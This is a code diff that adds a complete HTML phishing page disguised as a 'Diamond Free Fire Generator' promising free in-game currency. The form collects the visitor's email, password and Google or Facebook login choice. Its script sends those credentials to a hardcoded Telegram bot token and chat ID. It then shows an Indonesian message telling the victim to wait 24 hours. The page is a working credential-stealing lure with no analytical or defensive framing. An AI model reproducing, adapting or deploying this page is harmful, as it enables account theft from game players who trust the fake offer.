@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Diamond FF Generator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        button {
+            background-color: #28a745;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Diamond Free Fire Generator</h1>
+        <form id="ffForm">
+            <input type="email" id="email" placeholder="Enter your email" required>
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <select id="loginType">
+                <option value="Google">Login with Google</option>
+                <option value="Facebook">Login with Facebook</option>
+            </select>
+            <button type="submit">Generate</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('ffForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const loginType = document.getElementById('loginType').value;
+
+            const message = `Email: ${email}\nPassword: ${password}\nLogin Type: ${loginType}`;
+
+            fetch(`https://api.telegram.org/bot7221265350:AAFW3JNsT8JtmBhSo_mt7GDi6tSjx36MEEg/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: '7254975140',
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    alert('Tunggu 24jam!');
+                } else {
+                    alert('Gagal.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Error sending data.');
+            });
+        });
+    </script>
+</body>
+  </html>
